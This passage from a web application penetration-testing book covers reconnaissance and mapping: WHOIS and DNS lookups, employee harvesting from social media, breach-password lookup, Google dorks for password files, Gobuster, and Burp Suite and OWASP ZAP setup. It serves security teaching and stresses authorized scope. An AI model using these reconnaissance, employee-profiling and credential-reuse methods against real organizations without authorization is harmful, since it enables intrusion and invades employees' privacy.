*   Realistic assessment: Grey box testing aims to replicate the approach of an attacker who has gained information about the target, providing a more realistic view of potential attack vectors.
*   Balanced approach: Grey box testing balances the thorough analysis of white box testing and the real-world simulation of black box testing.
*   Enhanced efficiency: Compared to white box testing, grey box testing can be more efficient, as testers do not need to review the entire codebase but can still target critical components.
*   Identification of hidden vulnerabilities: By combining external and internal perspectives, grey box testing can reveal vulnerabilities that might be obscured or not immediately evident in purely black box testing.
*   Risk prioritization: Grey box testing allows prioritizing vulnerabilities based on their potential impact and likelihood of exploitation.

In principle, grey-box testing bridges the gap between black-box and white-box methodologies, supplying a nuanced assessment of a system's security. Using limited internal information, grey box testing offers a pragmatic approach to finding vulnerabilities that attackers could exploit with some insider knowledge while emulating the challenges of external penetration testing. For many scenarios, grey box testing is recommended, as it combines the advantages of both black box and white box testing while minimizing their disadvantages.

[Conclusion](#contents.xhtml_sc2_19a)

This chapter has laid the cornerstone for your journey into the intricate domain of Java security. With a solid understanding of the OWASP Top 10 vulnerabilities, you are better equipped to find and address the most critical security risks. Secure coding and design principles are now within your grasp, enabling you to weave security into the very fabric of your applications. The overview of penetration testing and the distinctions between white, black, and grey box testing supply a strong foundation for your foray into ethical hacking and security testing. As you go through the following chapters, remember that the knowledge gained in this chapter is the keystone to building, protecting, and testing the secure Java applications of the future.

# [CHAPTER 2Reconnaissance and Mapping](#contents.xhtml_ch02a)

[Introduction](#contents.xhtml_sc2_20a)

In the ever-evolving cyber security environment, the ability to thoroughly understand and assess the vulnerabilities of web applications is vital. As one of the most widely used programming languages in web application development, Java presents unique challenges and opportunities for penetration testers. This chapter delves into the initial phases of web application penetration testing, focusing on mapping and reconnaissance techniques tailored to Java-based applications. These techniques are the first steps to identifying underlying technologies, uncovering hidden information, and building a comprehensive foundation for further testing. As we embark on this exploration, we will equip you with the knowledge and tools necessary to become a mapping expert, charting the unknown territories of web applications with precision and skill.

[Structure](#contents.xhtml_sc2_21a)

This chapter will discuss the two initial phases of an assessment:

*   Reconnaissance
*   Mapping web applications

[Objectives](#contents.xhtml_sc2_22a)

By the end of this chapter, you will be familiar with the basic parts of reconnaissance and mapping a web application. You will learn to identify technologies using builtwith.com, Wappalyzer browser extension, and open-source intelligence (OSINT). We will also discover hidden content using OSINT and Gobuster.

[Reconnaissance](#contents.xhtml_sc2_23a)

In Java application penetration testing, effective reconnaissance is akin to the stealthy work of intelligence operatives gathering crucial information before a mission begins. Unlike direct engagement with the target, reconnaissance is conducted without overt interaction. It does not involve visiting the website, making phone calls, physically venturing to locations, or engaging with employees. Instead, the goal is accumulating data and building a solid foundation for later testing and assessment.

The reconnaissance phase is a quiet stage for information collection, and several critical pieces of data are looked for before direct testing can begin. This data can vary based on the scope of work, the contract language, and the purpose of the assessment. Following is a list of data generally included in reconnaissance:

*   Selecting the targets: This first step involves careful target choice, identifying the specific web applications or systems under scrutiny.
*   Gathering information about technologies and configuration: Reconnaissance aims to discover the technological environment that underpins the target. This includes identifying the operating systems, web servers, application servers, and programming languages.
*   Compiling lists of employees: An understanding of the organizational structure is essential. Reconnaissance compiles lists of employees, their roles, and their access privileges within the system.
*   Uncovering organizational information: Reconnaissance efforts extend beyond the digital realm to gather information about the organization. This can include business objectives, partners, vendors, mergers, new products, and other pertinent details.
*   Identifying password reset information: Knowing how password resets are handled can be invaluable for subsequent testing, especially if weaknesses or vulnerabilities can be exploited.
*   Exploring trust relationships: Reconnaissance seeks to uncover trust relationships or integrations with other systems, as these can provide potential attack vectors.
*   Collecting code snippets: Understanding code snippets used in the application can identify vulnerabilities or weaknesses that may not be apparent from the surface.

By meticulously piecing together this data, reconnaissance lays the groundwork for comprehensive and effective penetration testing. It equips penetration testers with the intelligence needed to navigate the target's environment, increasing the chances of uncovering vulnerabilities and fortifying security defenses. In Java application penetration testing, reconnaissance is the silent first step of ethical hacking.

Before we start the technical portion of Java application penetration testing, we must gather as much information as possible using reconnaissance tools and techniques. This will lay the foundation for our testing. In this section, we will explore three fundamental aspects of reconnaissance:

*   Target validation: The first step in our journey involves ensuring our targets are valid and worth our attention. We will discuss techniques to confirm the existence and relevance of our chosen web applications.
*   OSINT harvesting: OSINT is a treasure trove of publicly available information that can provide invaluable insights into our targets. We will explore how to harvest and harness this data effectively.
*   Social media and search engine hacking: In the digital age, social media platforms and search engines are rich sources of information. We will explore strategies for extracting intelligence from platforms like Facebook, LinkedIn, and Twitter.

Each section will equip you with the basic knowledge and skills necessary for reconnaissance. Using these reconnaissance tasks, you will be ready to discover the hidden details of your target web applications and pave the way for a successful Java application penetration testing endeavor. Let us begin our exploration of these essential reconnaissance building blocks.

[Target validations](#contents.xhtml_sc3_24a)

The first step is to validate our targets, ensuring our efforts focus on the correct web applications. Target validation involves confirming the existence and ownership of domains and IP addresses associated with the applications we are testing. This section will explore various techniques and tools to conduct thorough target validation.

Understanding the ownership and registration details of domains and IP addresses is foundational. This information can help us verify the legitimacy of our targets. One way is to use the WHOIS protocol. WHOIS is a valuable resource for retrieving domain registration information. This can be done via command line tools, or many websites will pull this information back for you. By querying WHOIS databases, we can uncover details about the domain owner, registrar, creation date, and more. In the following examples, we will look at the domain brackish.io. This is the raw data returned from WHOIS for brackish.io:

![](images/Figure_2.1.png)

Figure 2.1: Raw WHOIS data

The command line interface provides powerful tools for target validation. Here are some commonly used commands:

*   Dig (on Mac and Linux): The dig command is a versatile Domain Name Server (DNS) query tool that can retrieve information about domains and IP addresses. Use the command dig brackish.io. An example is shown in the following figure:

    ![](images/Figure_2.2.png)

    Figure 2.2: An example of dig protocol

*   Host (on Mac and Linux): The host command performs DNS lookups and provides information about domain names and IP addresses. Use command host brackish.io. See an example of the protocol response in the following figure:

    ![](images/Figure_2.3.png)

    Figure 2.3: Host command output

*   nslookup (on everything): The nslookup command is a cross-platform tool for querying DNS records and resolving hostnames. Use command nslookup brackish.io. An example is shown in the following figure:

    ![](images/Figure_2.4.png)

    Figure 2.4: Example use of nslookup on Windows

    We can enumerate and identify hosts associated with the target application beyond domain and IP validations. This can reveal more entry points and infrastructure details.

    In some cases, transferring DNS data is beneficial to gain more insights into the target's infrastructure. However, it is important to note that this technique is often out of scope and may not be permitted, especially on cloud platforms like AWS.

*   dig –t NS host +short: This command tries to retrieve the authoritative name servers for a domain. See a sample output in the following figure:

    ![](images/Figure_2.5.png)

    Figure 2.5: Using dig to get nameservers

*   Dig –t AXFR host @NS: The AXFR query attempts to transfer DNS zone data from a specified name server. Looking at the nameservers returned shows that our host uses AWS DNS. AWS does not allow DNS zone transfers, so as a responsible penetration tester, we should stop and not perform this step.

| Note: When conducting target validation, respect the rules of engagement and scope defined for your penetration testing project. While DNS data transfer can provide valuable information, it must be performed within the boundaries set by the organization and any relevant regulations. |

[Open-source intelligence harvesting](#contents.xhtml_sc3_25a)

In the penetration testing world, knowledge is power, and that knowledge often begins with a trail of digital breadcrumbs scattered across the internet. OSINT harvesting is the art of gathering valuable information from publicly available sources. It is a critical phase in understanding your target's digital environment. This can be done manually or using automated tools such as the harvester and recon-ng. Both of these are complicated tools with a lot of options. Exploring these tools will be left as an exercise for the reader. In this section, we will explore manual methods and simple scripts. OSINT harvesting can provide a wealth of information, including:

*   Contact harvesting

    Contact harvesting is the ability to collect contact information that opens doors for potential exploitation and can be a stepping stone to uncovering weaknesses like weak password policies or triggering account lockouts. The best place to start is LinkedIn. Find the company's profile, which can be helpful in gathering news and other posted information. The most crucial piece of data is the list of employees. See the brackish.io example in the following figure:

    ![](images/Figure_2.6.png)

    Figure 2.6: LinkedIn profiles for our example company

    This first list of employees is a great starting point. OSINT can extend to all social networks to harvest public and private profiles. We should check these employees for information and try to find their other social network accounts on Facebook or Twitter. As we review this information, look for other employees who may be their Facebook friends or a link on LinkedIn who have not updated their employer. Paying particular attention to developer profiles related to the target can yield valuable insights. A developer may list what languages and application servers they use in their current job.

*   Breach analysis

    Breach analysis is using online tools to find breaches that have already happened that might allow you access or make things easier. There are always new breaches. Tools like haveibeenpwned can help identify compromised usernames and passwords. The list of employees found, and the information gathered from social media may have yielded usernames/email addresses. If those are in breach, then a password the user chooses is available. People are creatures of habit, so we often reuse passwords and have variations on the same passwords. Breach trackers like privacyrights.org can provide a comprehensive view of known issues. The following figure depicts data breach search on privacyrights.org:

    ![](images/Figure_2.7.png)

    Figure 2.7: [Privacyrights.org](https://Privacyrights.org) breach search

Information is often hidden within files. Examining file metadata can reveal hidden details pertinent to your investigation. Keep this point in mind when any PDF or Word documents are found in the next section on Google hacking.

Given all the information on the internet and how open many people are, a vast amount of digital data is available for those who know how to uncover it. OSINT harvesting is a pathway to navigate this environment, revealing insights that can help turn vulnerabilities into exploits during penetration testing efforts.

[Technology enumeration](#contents.xhtml_sc4_26a)

While OSINT harvesting primarily focuses on gathering information about individuals and organizations, it is equally essential to understand the underlying digital infrastructure. Technology enumeration plays a pivotal role in this regard. Knowing the client and server technologies can open potential attack vectors, especially when dealing with outdated software harboring known vulnerabilities. To collect this valuable intelligence, we can utilize a variety of sources, including:

*   Technology enumerators: Specialized tools and services like builtwith.com can scan websites and provide detailed reports on the technologies employed. This includes web frameworks, content management systems, and more. An example of using builtwith.com with our example web application is shown in the following figure:

![](images/Figure_2.8.png)

Figure 2.8: Builtwith.com example

*   Job postings: Examination of job postings related to the target organization can reveal valuable insights into the technologies they require expertise in. This can hint at the technologies in use. Often, this is LinkedIn, the company career page, or can be found via other job sites like Glassdoor. Here is our example company’s career page:

![](images/Figure_2.9.png)

Figure 2.9: Job posting example

*   Forum analysis: Online forums and communities like StackOverflow often discuss technology stacks and issues encountered during development. Analyzing these discussions can offer glimpses into the technologies employed by the target.

Understanding the technology stack is not just an exercise in curiosity; it is a critical step in identifying potential vulnerabilities and crafting a targeted approach for Java application penetration testing. Combining technology enumeration with the broader scope of OSINT gathering will enable you to assess and secure web applications effectively.

[Search engine hacking](#contents.xhtml_sc3_27a)

Search engine hacking, also known as Google Hacking, is a technique that uses advanced operators to unearth hidden or sensitive information from the vast knowledge on the internet. Among the search engines, Google is the most prevalent platform for this practice. It allows penetration testers to utilize a series of specialized queries to pinpoint specific data points, providing valuable insights during the reconnaissance phase of Java application penetration testing.

The sources for different search engines are:

*   Bing: For Bing-specific queries and techniques, resources like bishopfox.com guide use advanced operators for precise searches. Refer to the link for detailed information: [https://resources.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/](https://resources.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/).
*   Google: Google Hacking is a well-documented art, with the Google Hacking Database on exploit-db.com  offering a wealth of query examples and insights. Refer the link for detailed information: [https://www.exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database).

    Examples of Google Hacking queries:

    *   intitle: “Index+of.etc” passwd: Searches for directories with potentially sensitive files like password files.
    *   intitle:admin intitle:login: Seeks web pages with login panels that may be susceptible to attacks.
    *   intitle:index.of.private: Targets private directories that may have sensitive content.
    *   filetype:asmx inurl:wsdl: Focuses on web service description files with potential vulnerabilities.
    *   site:myhost.com or domain:myhost.com: Limits searches to a specific website or domain, ensuring relevance and staying within the scope.

In this example, we will check everything at brackish.io using the site:

![](images/Figure_2.10.png)

Figure 2.10: Google Hacking: using the site keyword

Next, we can look for text files, but none are found. Refer to the following figure:

![](images/Figure_2.11.png)

Figure 2.11: Google Hacking: using filetype

Search engine hacking extends beyond typical web application reconnaissance. It can also discover sensitive information stored in cloud source code repositories. For instance, by using queries like site:github.com, penetration testers can search GitHub and other online repositories for inadvertent disclosures of debugging information, development notes, and configuration files. This approach can yield valuable insights, such as credentials, keys, and information about apps stored in private repositories. Sources for this search may include Pastes, Gists (typically public and belonging to individuals), and Snippets.

In platforms like GitHub, advanced searching capabilities further enhance the process, allowing testers to refine their queries and hone in on specific data points. When performing a penetration test, search engine hacking is a potent tool for gathering intelligence and identifying potential vulnerabilities that may otherwise remain hidden in the digital environment.

[Mapping web applications](#contents.xhtml_sc2_28a)

When performing an application penetration test, the mapping process is the core on which the penetration test is based. Mapping is the second phase of the penetration test, and a thorough mapping provides better results. Its purpose is twofold: to provide a solid foundation by establishing an HTTP request and response baseline and to provide essential information about the targeted application. As a skilled mapper of a web application, your task during this phase is to uncover critical details that give the foundation for later testing. Your requests are comprehensive, encompassing the application's functionalities and the underlying technological environment. Some information you hope to figure out includes:

*   Identify what operating system is hosting the application.
*   Figure out what web server and application server the application is using for its operation.
*   Determine what programming languages are used in the front-end and back-end.

Beyond this, mapping extends its reach to the client side by studying the technologies employed there. As you dig deeper into the application's core, you will uncover sequential process flows, unraveling the intricate web of interactions that define its behavior. Through mapping, we will discover the hidden sides of the application, transforming the unknown into an understandable and navigable topography for the skilled penetration tester.

The approach to mapping is to use the application like a user but with added tooling and observations so that we can understand it. The primary tasks in mapping are to identify technologies, get a baseline of HTTP requests and responses, discover hidden content, identify sequential process flows, and perform functional analysis.

[Identifying technologies](#contents.xhtml_sc3_29a)

Identifying technologies during the mapping phase is done via browser extensions such as Wappalyzer, HTTP responses, and error messages which may contain sensitive data.

Wappalyzer is a browser extension that can be added to Firefox or Chrome, and it will automatically identify technologies as you browse. Just click the Wappalyzer icon to see a list of technologies that we identified. An example using brackish.io is given in the following figure:

![](images/Figure_2.12.png)

Figure 2.12: Wappalyzer example

The best part of using Wapplyzer is that it works on external and internal applications since it is browser-based.

Using developer tools to observe the HTTP requests and responses, we can check for sensitive information that may be leaked. In this example, the web server and version are identified, as well as the operating system in the header:

![](images/Figure_2.13.png)

Figure 2.13: Using HTTP responses to gather information

The response headers tell us that Brackish.io uses Apache 2.4.52 to host this application on an Ubuntu OS. If any error messages are found while getting the HTTP request baseline, those should also be checked for any sensitive information disclosure.

[HTTP request and response baseline](#contents.xhtml_sc3_30a)

Our next step is to request all available pages to get a request baseline. This should be done using an interception proxy, which will be covered in the next chapter. The interception proxy will keep a history of the exact requests for you.

Often, it is good to take notes beside the baseline as you go through the web application. There are many ways to do this. One way to keep information is to use a spreadsheet as you browse. In the spreadsheet, list each page you browse and certain helpful information that can guide your testing. An example spreadsheet might look like the following:

![](images/Figure_2.14.png)

Figure 2.14: Mapping application chart

In this chart, the registration page has been filled out—the yes or no in the chart point to specific tests that should be run. In this example, as the registration page talks to a database, it will need to be tested for SQL injection, and the client-side validation will need to be bypassed to check if there are further server-side validations, etc. We could also add a sequential process flow column to the chart.

Suppose this structure does not seem a good fit for the current application and team. An alternative method is to use a one-note or similar and set up a section for each part of the application. As you get your baseline, make notes about anything suspicious that you see that you want to remember to test for later. For example, if the application displays the username on a page, then note to test the username for XSS in that section.

[Discovering hidden content](#contents.xhtml_sc3_31a)

Discovering hidden content on a web application is often a guessing game, and whether or not you find existing hidden content can depend on luck and your wordlist. There are a few basics that you should always check. One of these is checking for a robots.txt file. You can do this by browsing the robots.txt after the domain name. The following example of brackish.io  robots.txt file is depicted in [Figure 2.15](#ch02.xhtml_fig2-15):

![](images/Figure_2.15.png)

Figure 2.15: Robots.txt File

This shows us the WordPress login location and provides the sitemap, which we should check to see if any pages were missed. Other less common files are humans.txt and security.txt, which may contain interesting information if they exist.

Using a spider tool, generally included with an interception proxy, is also helpful. Spiders will follow all links getting a baseline request for you. Verify your settings to keep the spider in scope.

Then, you can use content discovery tools to find hidden directories. These will use wordlists and file extensions and try to guess what may exist. OWASP Zap and Burp Suite have content discovery tools, which will be covered in the next section. A simple command line content discovery tool is Gobuster. The command and response look like:

gobuster dir -u https://brackish.io -w ~/wordlists/shortlist.txt

===============================================================

Gobuster v3.2.0

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Mode : dir

[+] Url/Domain : https://brackish.io/

[+] Threads : 10

[+] Wordlist : /home/oj/wordlists/shortlist.txt

[+] Status codes : 200,204,301,302,307,401,403

[+] User Agent : gobuster/3.2.0

[+] Timeout : 10s

===============================================================

2023/09/26 11:49:43 Starting gobuster

===============================================================

/wp-admin (Status: 301)

===============================================================

2023/09/26 11:49:44 Finished

===============================================================

[Functional analysis](#contents.xhtml_sc2_32a)

Functional analysis occurs concurrently with the other steps. This refers to understanding how this application works and possible vulnerabilities. In this step, you should think about any sequential process flows. Some common flows include registration and forgot password. These flows need to be identified for testing.

The notes that were suggested to be taken concurrently with baseline help here. Review your notes and HTTP baselines to understand how everything works, and make any additional notes related to your analysis. If you see JavaScript being called for encryption or other cryptographic purposes, then, make a note to see if you can call that function from the console. If any of the versions of software or technologies have known vulnerabilities, make a note with all the details so you can test more later. When there is something that you do not understand how or why it worked as observed, then make a note to do more testing on that component later.

[Conclusion](#contents.xhtml_sc2_33a)

This chapter gave a quick overview of reconnaissance and mapping techniques related to web applications. These are essential to a thorough penetration test. Good reconnaissance and mapping can considerably increase the number of exploits you can perform in your penetration test. Remember to get as much information as possible while staying within your contractual scope.

In the next chapter, you will be introduced to using a web proxy, including setting up and choosing a web proxy to start mapping your first application.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 3Hands-on with Web Proxies](#contents.xhtml_ch03a)

[Introduction](#contents.xhtml_sc2_34a)

A web application proxy is the most common tool for web application penetration testing. Web application proxies allow you to intercept and modify requests between a client and a server. By intercepting the HTTP messages, you study the web application behavior and manually test for vulnerabilities. Most web application proxies have other built-in tools and extensions, which will be discussed.

[Structure](#contents.xhtml_sc2_35a)

This chapter will discuss the two common web application proxies:

*   Burp Suite Community Edition
*   OWASP ZAP

[Objectives](#contents.xhtml_sc2_36a)

By the end of this chapter, you will be familiar with the two most commonly used web application proxies: Burp Suite and OWASP ZAP. Both have a variety of extensions and other built-in tools that are useful for different testing purposes. Burp Suite offers a free community version with limitations, as well as a paid professional version. The professional version includes a well-regarded DAST scanner. OWASP ZAP is an open-sourced web application proxy with a free DAST scanner. The proxies of both have similar features. Burp Suite Professional’s DAST scanner is decidedly better than ZAP’s DAST scanner, although it is only available in the paid version, unlike ZAP’s DAST scanner. You will understand how to install and use both tools by the end of the chapter.

[Burp Suite Community Edition](#contents.xhtml_sc2_37a)

The Community Edition of Burp Suite can be downloaded here: [https://portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload).

The website shown in [Figure 3.1](#ch03.xhtml_fig3-1) currently has Download choices for Linux, Mac, Windows, and Java Jar:

![](images/Figure_3.01.png)

Figure 3.1: Burp Suite download options

The JAR version can be a great choice if you want a tool with a light footprint that does not require installation. You can run the JAR from the command line with Java using the command:

java -jar -Xmx4g /path/burp.jar

The -Xmx4g flag says you are giving Burp Suite 4 GBs of RAM. The /path/burp.jar should be replaced with the location where you downloaded the jar file. At the time of this writing, Burp Suite requires Java version 17.

Otherwise, download the version corresponding to your operating system and run the installer.

Now, assuming you have downloaded and installed Burp Suite or are using the Java JAR, let us look at getting the basic tool running:

1. After starting Burp Suite on the first screen shown in [Figure 3.2](#ch03.xhtml_fig3-2), you will click Next, excepting a temporary file, as the Community Edition cannot open a saved project or save to disk:

![](images/Figure_3.02.png)

Figure 3.2: Burp Suite start screen

2. On the next screen, shown in [Figure 3.3](#ch03.xhtml_fig3-3), you can Use Burp defaults or Load from the configuration file. Click the Start Burp button in the lower right to start with default values:

![](images/Figure_3.03.png)

Figure 3.3: Burp Suite startup screen

3. Burp Suite will open to the Proxy tab, as shown in [Figure 3.4](#ch03.xhtml_fig3-4):

![](images/Figure_3.04.png)

Figure 3.4: Burp Suite Proxy tab

4. Burp Suite now contains an embedded browser that is easier to use than setting up Burp Suite to use your regular browser. Start the embedded Chrome browser, by clicking the Open Browser button.

Now, Burp Suite is running, and the embedded browser is open. Any pages you browse through the embedded browser will go through Burp Suite.

Depending on your situation, you may need several other configuration steps. Next, we will go through some basic configurations that you may need.

By default, Burp Suite runs on port 8080 on your machine. If you need port 8080 for something else, or you are running a web server or another application on 8080, then you can change the port in the proxy settings:

1. To change the port, go to the Proxy tab and select Options.

2. Then click on the Proxy Listeners to highlight it.

3. Click the Edit button to bring up the pop-up, allowing you to change the port or other proxy settings, as shown in the following [Figure 3.5](#ch03.xhtml_fig3-5):

![](images/Figure_3.05.png)

Figure 3.5: Burp Suite proxy settings

After changing your proxy to an available port on your machine, click the OK button.

4. You will need to restart the embedded browser.

If your web application is limited to only a particular browser that is not Chrome, then follow these steps to set up the browser you choose to send data through Burp Suite:

a. Open up the proxy settings for your browser.

b. Search your browser's settings for the proxy if you cannot find these settings.

c. Change those to point to Burp Suite. The IP address should be 127.0.0.1 and the port is the Burp Suite listening port, which by default is 8080. On Firefox, an example of these settings is shown in [Figure 3.6](#ch03.xhtml_fig3-6):

![](images/Figure_3.06.png)

Figure 3.6: Browser proxy settings

d. Note that the No proxy for textbox is empty Often, this is configured by default to exclude 127.0.0.1 or localhost. Make sure to remove that if necessary.

e. Click to save the settings.

You must install the Burp Suite certificate for encrypted communications (for example, HTTPS) when using a browser other than the embedded Burp Suite browser.

These steps will walk you through the process:

1. To download the certificate, browse to the Burp Suite location [http://127.0.0.1:8080](http://127.0.0.1:8080) (change the port in the URL if you configured a different port).

2. Click on the CA Certificate button in the right-hand corner.

3. Save this file to your machine.

Take a look at the following [Figure 3.7](#ch03.xhtml_fig3-7):

![](images/Figure_3.07.png)

Figure 3.7: CA Certificate download

4. Then, go to your browser settings and import this certificate. There are slight variations in how it is done, but most modern browsers are similar. First, search for the certificate from Settings, as shown in [Figure 3.8](#ch03.xhtml_fig3-8):

![](images/Figure_3.08.png)

Figure 3.8: Manage certificates

5. Then select the Manage certificate option.

6. When the popup displays, select Import… as shown in [Figure 3.9](#ch03.xhtml_fig3-9):

![](images/Figure_3.09.png)

Figure 3.9: Import certificate

7. The Import… option will open up a wizard to guide you. When given the option, select the downloaded file.

8. When asked to choose the type of certificate, select Trusted Root Certificate.

9. Then click OK, and the browser will be set to use Burp Suite. Refer to the following [Figure 3.10](#ch03.xhtml_fig3-10):

![](images/Figure_3.10.png)

Figure 3.10: Trusted Root Certificate

| Note: There is one circumstance when Burp Suite will fail. If the website uses certificate pinning, the application will recognize the incorrect certificate and fail. Very few websites use certificate pinning, so this happens rarely. |

[Using Burp Suite Community Edition](#contents.xhtml_sc3_38a)

Now that Burp Suite is set up, you are ready to use it.

The web application proxy found in the proxy tab is the base component. By default, the intercept is on. When intercept is on, Burp Suite stops all requests, and nothing will appear in your browser until you click Forward, which will send the request to the server. Click Intercept  to turn the intercept off. When intercept is off, all requests will be logged in the history, but the browser will work normally. When it is off, the button will say intercept is off, which, when pressed, will turn the intercept on. Please refer to the following figure:

![](images/Figure_3.11.png)

Figure 3.11: Burp Suite Intercept on or off

If you want Burp Suite to maintain a history but are not interested in altering the requests, then turn off Intercept and browse the web application.

Burp Suite maintains a history of every request you send in the HTTP history tab of the proxy tool.

After browsing the web application, move to the Target tab, and you will see a list of all URLs you have visited and a tree that contains each page discovered during those visits. If there were any passive vulnerability findings, Burp Suite will identify and show them on the far right. Refer to the following [Figure 3.12](#ch03.xhtml_fig3-12):

![](images/Figure_3.12.png)

Figure 3.12: Burp Suite Target tab

The Scope tab allows you to set the scope of your engagement, which can be used to limit your history and keep any sensitive pages from being recorded. The scope also limits automated content discovery, scanning, and testing.

You can also set the scope by right-clicking on a URL in the Target tab and clicking Add to scope, as shown in [Figure 3.13](#ch03.xhtml_fig3-13):

![](images/Figure_3.13.png)

Figure 3.13: Add to scope

The Repeater tool allows you to send the same request without modifications repeatedly. To send a request to the Repeater tab, right-click on any request from either the Target | Site Map tab or Proxy | HTTP History tab and select Send to Repeater from the menu. This can also be accessed with the shortcut Ctrl+R. Refer to the following [Figure 3.14](#ch03.xhtml_fig3-14):

![](images/Figure_3.14.png)

Figure 3.14: Burp Suite Send to Repeater

The requests can be quickly resent and modified. From the Repeater window, there is a history of each request you send, which can be navigated by the top arrow buttons, as seen in [Figure 4.15](#ch04.xhtml_fig4-15). The requests are sent to the Target in the top right corner. Modifying the Host header changes only the header, not where the request is sent.

![](images/Figure_3.15.png)

Figure 3.15: Repeater Tab

A right-click menu on the request in the Repeater tab lets you quickly change the HTTP method and encoding. See the following [Figure 3.16](#ch03.xhtml_fig3-16):

![](images/Figure_3.16.png)

Figure 3.16: Repeater Right-Click Menu

Another built-in Burp Suite tool is the Intruder tool. This tool allows one to enumerate through a set of choices for a parameter, header, or even part of the URL. It is throttled in the Community Edition; generally, it is useless if you want to send over 100 requests. The intruder tool can be reached similarly to the repeater by right-clicking on a request and clicking Send to Intruder.

The initial screen you will see looks like the one shown in [Figure 3.17](#ch03.xhtml_fig3-17):

![](images/Figure_3.17.png)

Figure 3.17: Intruder Tab

The items highlighted above represent the parameters Burp Suite suggests for enumeration. These may or may not be what you want. Click the Clear button to remove the automatic choices, then use the mouse to highlight the spot you want to enumerate values for and click Add to select your spots. After choosing your parameters to enumerate through, ensure the Attack type is correct. Sniper is best if only one value is highlighted. If multiple values are highlighted, the sniper attack will leave all but one value blank as it enumerates through the list of values. Refer to the following [Figure 3.18](#ch03.xhtml_fig3-18):

![](images/Figure_3.18.png)

Figure 3.18: Burp Suite Intruder Attack Options

To send the same value to multiple parameters, use Battering ram.

Pitchfork has a different payload list for each parameter. So, this is a good choice for using known username and password lists, where you know X username has Y password.

Cluster bombs will go through all the possible combinations.

After selecting the attack type, let us look at the Payload tab shown in the figure below to configure the attack options.

![](images/Figure_3.19.png)

Figure 3.19: Intruder Payload Tab

The Payload tab can be used to set the lists to iterate through. If multiple payloads exist, select the Payload Sets to move between them. The most common types are lists and numbers.

You can load a list from a file with the load button or type them in individually. Burp Suite also has some built-in lists you can use. In the drop-down Add from list, you will find the built-in lists.

When the Payload type is Numbers, then you select the start and end numbers, as well as what to count by.

The Resource Pool and Options allow advanced options for threading and extracting data from the attack. Click Start Attack to commence the attack.

The Sequencer tool will be covered in detail in [Chapter 11](#ch11.xhtml), Session Management.

The Extender tab allows us to add extensions to Burp Suite. Click on the BApp Store to see released extensions. The list can be sorted by rating or popularity. The detail column shows whether or not the extension is only available for pro users. If you click on the Extension, you can read details about it. Refer to the following [Figure 3.20](#ch03.xhtml_fig3-20):

![](images/Figure_3.20.png)

Figure 3.20: Bapp Store

Several extensions require Python or, occasionally, Ruby to run. The standalone libraries to run these extensions can be set in the Options tab of Extender. as shown in [Figure 3.21](#ch03.xhtml_fig3-21):

![](images/Figure_3.21.png)

Figure 3.21: Extender Options

The Jython standalone library is used to run Python in Java and can be downloaded using the following link:

[https://www.jython.org/download.html](https://www.jython.org/download.html).

JRuby, which is similarly a standalone file to run Ruby from Java, can be downloaded using the following link:

[https://www.jruby.org/download](https://www.jruby.org/download).

The Autorize extension, retire.js, HTTP Smuggler extension, and JSON Web Token Attacker are popular Community extensions you may want to consider. The Autorize extension will be discussed later in [Chapter 11](#ch11.xhtml), Authorization Practices.

[OWASP ZAP](#contents.xhtml_sc2_39a)

OWASP ZAP is the second most popular web application proxy. Many features are similar to Burp Suite. The differences will be discussed in detail in this section. The OWASP ZAP project can be downloaded at:  [https://www.zaproxy.org/download/](https://www.zaproxy.org/download/).

The following options are available, see [Figure 3.22](#ch03.xhtml_fig3-22):

![](images/Figure_3.22.png)

Figure 3.22: ZAP Download Options

After downloading the version for your operating system, run the installer and start ZAP. When ZAP starts, you choose Manual Explore or Automated Scan. Select Manual Explore to get started with the web application proxy functionality. Refer to the following [Figure 3.23](#ch03.xhtml_fig3-23):

![](images/Figure_3.23.png)

Figure 3.23: OWASP ZAP Start Screen

There is an option to have ZAP launch Chrome or Firefox. On first use, you may see an error on the screen saying the browser is not found, as shown in the following figure:

![](images/Figure_3.24.png)

Figure 3.24: Browser Not Found Error

Then, try updating ZAP to ensure you have the latest web drivers. The update can be found under the Help tab and Check for Updates, as shown in [Figure 3.25](#ch03.xhtml_fig3-25):

![](images/Figure_3.25.png)

Figure 3.25: OWASP ZAP Help Tab

Then, you can use the search bar to find web drivers. They may need to be installed from the marketplace, as shown in [Figure 3.26](#ch03.xhtml_fig3-26):

![](images/Figure_3.26.png)

Figure 3.26: OWASP ZAP Marketplace

If that does not work, you must configure the proxy in your web browser to go through ZAP. This is done similarly to Burp Suite by finding the proxy settings and changing them to match the ZAP port.

OWASP ZAP includes a DAST tool. Clicking on the automated scan will start this DAST tool. Enter the URL and then click Attack. The discovered URLs will appear as shown in [Figure 3.27](#ch03.xhtml_fig3-27):

![](images/Figure_3.27.png)

Figure 3.27: OWASP Zap DAST Scan

The plus icon can be clicked to open up a menu of different tools that might be useful.

![](images/Figure_3.28.png)

Figure 3.28: OWASP ZAP Tools

The Forced Browse is the well-known DirBuster tool used for enumerating content via a specified word list.

Each tool has an option found under the Tools tab, Options selection. Refer to the following figure:

![](images/Figure_3.29.png)

Figure 3.29: OWASP ZAP Tools Options

Trying out the different tools and options will allow you to learn about them and how they work. Standard tools in OWASP ZAP are Active Scan, API, Fuzzer, and Forced Browse.

[Conclusion](#contents.xhtml_sc2_40a)

Having the right tools is essential in the ever-changing web application security environment. In this chapter, we explored the world of web proxies, focusing on the fundamental capabilities of two prominent tools: Burp Suite Community Edition and OWASP ZAP (Zed Attack Proxy). We embarked on a journey to understand how these proxies can assist security professionals and developers in identifying and detecting vulnerabilities in web applications.

In the next chapter, web proxies will be used extensively in identifying and exploiting web application vulnerabilities.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 4Observability with SQL Injections](#contents.xhtml_ch04a)

[Introduction](#contents.xhtml_sc2_41a)

